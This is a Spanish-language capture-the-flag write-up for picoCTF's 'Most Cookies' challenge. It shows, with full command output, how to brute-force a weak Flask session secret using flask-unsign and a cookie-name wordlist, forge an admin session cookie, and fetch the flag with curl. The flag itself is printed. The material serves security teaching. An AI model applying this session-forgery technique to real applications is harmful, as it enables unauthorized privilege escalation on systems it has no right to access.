**Reto**
	

**Descripción**
	Alright, enough of using my own encryption. Flask session cookies should be plenty secure! http://wily-courier.picoctf.net:60506/

**Solución**
	Comandos para CLI
		echo _cookie_base64_ | base64 -d
		nano cookies.txt
			snickerdoodle
			chocolate chip
			oatmeal raisin
			gingersnap
			shortbread
			peanut butter
			whoopie pie
			sugar
			molasses
			kiss
			biscotti
			butter
			spritz
			snowball
			drop
			thumbprint
			pinwheel
			wafer
			macaroon
			fortune
			crinkle
			icebox
			gingerbread
			tassie
			lebkuchen
			macaron
			black and white
			white chocolate macadamia
		sudo apt install python3-venv
		python3 -m venv ~/.venv
		source ~/.venv/bin/activate
		python3 -m pip install flask-unsign
		flask-unsign --unsign --cookie "_cookie_base64_" --wordlist cookies.txt → `right here is when you get my_word`
		flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret "_my_word_" → `right here is when you get new_cookie_base64`
		curl -s URL -H "Cookie: session=new_cookie_base64" | grep -o pico
		curl -s URL -H "Cookie: session=new_cookie_base64" | grep -o "picoCTF{[^}]*}"                                           ******
/
	Comandos reemplanzando las varibles en CLI
		echo eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.aaim1Q.SolVckkmlENn4cgwPs0lH3dM66Q | base64 -d
		nano cookies.txt
			snickerdoodle
			chocolate chip
			oatmeal raisin
			gingersnap
			shortbread
			peanut butter
			whoopie pie
			sugar
			molasses
			kiss
			biscotti
			butter
			spritz
			snowball
			drop
			thumbprint
			pinwheel
			wafer
			macaroon
			fortune
			crinkle
			icebox
			gingerbread
			tassie
			lebkuchen
			macaron
			black and white
			white chocolate macadamia
		sudo apt install python3-venv
		python3 -m venv ~/.venv
		source ~/.venv/bin/activate
		python3 -m pip install flask-unsign
		flask-unsign --unsign --cookie "eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.aaim1Q.SolVckkmlENn4cgwPs0lH3dM66Q" --wordlist cookies.txt → `right here is when you get 'wafer'`
		flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret "wafer" → `right here is when you get eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.aaipEg.z3YSVDNL1WiWudxWK5FVXRXzW2I`
		curl -s http://wily-courier.picoctf.net:60506/display -H "Cookie: session=eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.aaipEg.z3YSVDNL1WiWudxWK5FVXRXzW2I" | grep pico
		curl -s http://wily-courier.picoctf.net:60506/display -H "Cookie: session=eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.aaipEg.z3YSVDNL1WiWudxWK5FVXRXzW2I" | grep -o "picoCTF{[^}]*}"                                           ******
/
	Resultados de la CLI
		┌──(kali㉿kali)-[~]
		└─$ echo eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.aaim1Q.SolVckkmlENn4cgwPs0lH3dM66Q | base64 -d
		
		{"very_auth":"snickerdoodle"}base64: invalid input
		                                                                                                         
		┌──(kali㉿kali)-[~]
		└─$ nano cookies.txt
		                                                                                                         
		┌──(kali㉿kali)-[~]
		└─$ sudo apt install python3-venv
		[sudo] password for kali: 
		python3-venv is already the newest version (3.13.7-1).
		Summary:                    
		  Upgrading: 0, Installing: 0, Removing: 0, Not Upgrading: 0
		                                                                                                         
		┌──(kali㉿kali)-[~]
		└─$ python3 -m venv ~/.venv
		                                                                                                                                                                                                                 
		┌──(kali㉿kali)-[~]
		└─$ source ~/.venv/bin/activate
		                                                                                                         
		┌──(.venv)─(kali㉿kali)-[~]
		└─$ python3 -m pip install flask-unsign
		Collecting flask-unsign
		  Downloading flask_unsign-1.2.1-py3-none-any.whl.metadata (6.9 kB)
		Collecting flask (from flask-unsign)
		  Downloading flask-3.1.3-py3-none-any.whl.metadata (3.2 kB)
		Collecting requests (from flask-unsign)
		  Downloading requests-2.32.5-py3-none-any.whl.metadata (4.9 kB)
		Collecting itsdangerous (from flask-unsign)
		  Downloading itsdangerous-2.2.0-py3-none-any.whl.metadata (1.9 kB)
		Collecting markupsafe (from flask-unsign)
		  Downloading markupsafe-3.0.3-cp313-cp313-manylinux2014_x86_64.manylinux_2_17_x86_64.manylinux_2_28_x86_64.whl.metadata (2.7 kB)
		Collecting werkzeug (from flask-unsign)
		  Downloading werkzeug-3.1.6-py3-none-any.whl.metadata (4.0 kB)
		Collecting blinker>=1.9.0 (from flask->flask-unsign)
		  Downloading blinker-1.9.0-py3-none-any.whl.metadata (1.6 kB)
		Collecting click>=8.1.3 (from flask->flask-unsign)
		  Downloading click-8.3.1-py3-none-any.whl.metadata (2.6 kB)
		Collecting jinja2>=3.1.2 (from flask->flask-unsign)
		  Downloading jinja2-3.1.6-py3-none-any.whl.metadata (2.9 kB)
		Collecting charset_normalizer<4,>=2 (from requests->flask-unsign)
		  Downloading charset_normalizer-3.4.4-cp313-cp313-manylinux2014_x86_64.manylinux_2_17_x86_64.manylinux_2_28_x86_64.whl.metadata (37 kB)
		Collecting idna<4,>=2.5 (from requests->flask-unsign)
		  Downloading idna-3.11-py3-none-any.whl.metadata (8.4 kB)
		Collecting urllib3<3,>=1.21.1 (from requests->flask-unsign)
		  Downloading urllib3-2.6.3-py3-none-any.whl.metadata (6.9 kB)
		Collecting certifi>=2017.4.17 (from requests->flask-unsign)
		  Downloading certifi-2026.2.25-py3-none-any.whl.metadata (2.5 kB)
		Downloading flask_unsign-1.2.1-py3-none-any.whl (14 kB)
		Downloading flask-3.1.3-py3-none-any.whl (103 kB)
		Downloading blinker-1.9.0-py3-none-any.whl (8.5 kB)
		Downloading click-8.3.1-py3-none-any.whl (108 kB)
		Downloading itsdangerous-2.2.0-py3-none-any.whl (16 kB)
		Downloading jinja2-3.1.6-py3-none-any.whl (134 kB)
		Downloading markupsafe-3.0.3-cp313-cp313-manylinux2014_x86_64.manylinux_2_17_x86_64.manylinux_2_28_x86_64.whl (22 kB)
		Downloading werkzeug-3.1.6-py3-none-any.whl (225 kB)
		Downloading requests-2.32.5-py3-none-any.whl (64 kB)
		Downloading charset_normalizer-3.4.4-cp313-cp313-manylinux2014_x86_64.manylinux_2_17_x86_64.manylinux_2_28_x86_64.whl (153 kB)
		Downloading idna-3.11-py3-none-any.whl (71 kB)
		Downloading urllib3-2.6.3-py3-none-any.whl (131 kB)
		Downloading certifi-2026.2.25-py3-none-any.whl (153 kB)
		Installing collected packages: urllib3, markupsafe, itsdangerous, idna, click, charset_normalizer, certifi, blinker, werkzeug, requests, jinja2, flask, flask-unsign
		Successfully installed blinker-1.9.0 certifi-2026.2.25 charset_normalizer-3.4.4 click-8.3.1 flask-3.1.3 flask-unsign-1.2.1 idna-3.11 itsdangerous-2.2.0 jinja2-3.1.6 markupsafe-3.0.3 requests-2.32.5 urllib3-2.6.3 werkzeug-3.1.6
		                                                                                                         
		┌──(.venv)─(kali㉿kali)-[~]
		└─$ flask-unsign --unsign --cookie "eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.aaim1Q.SolVckkmlENn4cgwPs0lH3dM66Q" --wordlist cookies.txt
		[*] Session decodes to: {'very_auth': 'snickerdoodle'}
		[*] Starting brute-forcer with 8 threads..
		[+] Found secret key after 28 attemptscadamia
		'wafer'
		                                                                                                         
		┌──(.venv)─(kali㉿kali)-[~]
		└─$ flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret "wafer"
		eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.aaipEg.z3YSVDNL1WiWudxWK5FVXRXzW2I
		                                                                                                         
		┌──(.venv)─(kali㉿kali)-[~]
		└─$ curl -s http://wily-courier.picoctf.net:60506/display -H "Cookie: session=eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.aaipEg.z3YSVDNL1WiWudxWK5FVXRXzW2I" | grep pico           
		            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{cO0ki3s_yum_7ff5bad5}</code></p>
		                                                                                                         
		┌──(.venv)─(kali㉿kali)-[~]
		└─$ curl -s http://wily-courier.picoctf.net:60506/display -H "Cookie: session=eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.aaipEg.z3YSVDNL1WiWudxWK5FVXRXzW2I" | grep -o "picoCTF{[^}]*}"
		picoCTF{cO0ki3s_yum_7ff5bad5}
/
	Browser
		Una vez hecho los pasos en la CLI, poria realizarse el siguiente paso, ir al navegador con una extensión editora de cookies, y guardar la _new_cookie_base64_ para poder visualizar la bandedra en la url (http://wily-courier.picoctf.net:60506/display).
		<html lang="en"><head>
		    <title>Most Cookies</title>
		    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css" rel="stylesheet">
		    <link href="https://getbootstrap.com/docs/3.3/examples/jumbotron-narrow/jumbotron-narrow.css" rel="stylesheet">
		    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
		    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
		</head>
		<body>
		    <div class="container">
		        <div class="header">
		            <nav>
		                <ul class="nav nav-pills pull-right">
		                    <li role="presentation"><a href="/reset" class="btn btn-link pull-right">Reset</a>
		                    </li>
		                </ul>
		            </nav>
		            <h3 class="text-muted">Most Cookies</h3>
		        </div>
		        <div class="jumbotron">
		            <p class="lead"></p>
		            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{cO0ki3s_yum_7ff5bad5}</code></p>
		        </div>
		        <footer class="footer">
		            <p>© PicoCTF</p>
		        </footer>
		    </div>
		</body></html>

**Notes**
	1. El reto consiste en manipular cookies de sesión firmadas en una aplicación desarrollada con Flask.
	2. La aplicación almacena información de autenticación dentro de la cookie `session`.
	3. La cookie tiene tres partes separadas por puntos (`.`):
		- Payload en Base64
		- Timestamp
		- Firma digital
	4. Se obtuvo la cookie: eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.aaim1Q.SolVckkmlENn4cgwPs0lH3dM66Q
	5. Al decodificar la primera parte en Base64 se obtuvo: {"very_auth":"snickerdoodle"}
	6. Esto confirma que:
		- La cookie no está cifrada, solo codificada.
		- El valor `very_auth` controla el nivel de privilegio.
	7. La integridad de la cookie depende de una `SECRET_KEY` del servidor.
	8. Se utilizó la herramienta **flask-unsign** para intentar descubrir la clave secreta mediante un diccionario.
	9. Se preparó un wordlist con nombres de galletas relacionados con el contexto del reto.
	10. Mediante fuerza bruta se encontró la `SECRET_KEY`: wafer
	11. Con la clave obtenida, se generó una nueva cookie firmada con el valor: {'very_auth': 'admin'}
	12. Se envió la nueva cookie al endpoint `/display` usando `curl` o modificando la cookie desde el navegador.
	13. El servidor validó la firma correctamente y otorgó privilegios de administrador.
	14. Se obtuvo la bandera: picoCTF{cO0ki3s_yum_7ff5bad5}
	15. Tipo de vulnerabilidad explotada:
		- Weak Secret Key
		- Session Forgery
		- Privilege Escalation
	16. Conceptos clave:
		16.1. Las cookies de Flask están firmadas, no cifradas.
		16.2. Si la `SECRET_KEY` es débil, puede romperse por diccionario.
		16.3. Base64 no es cifrado.
		16.4. Una vez conocida la clave, se pueden generar sesiones válidas arbitrarias.

**Referencias**
	https://github.com/Paradoxis/Flask-Unsign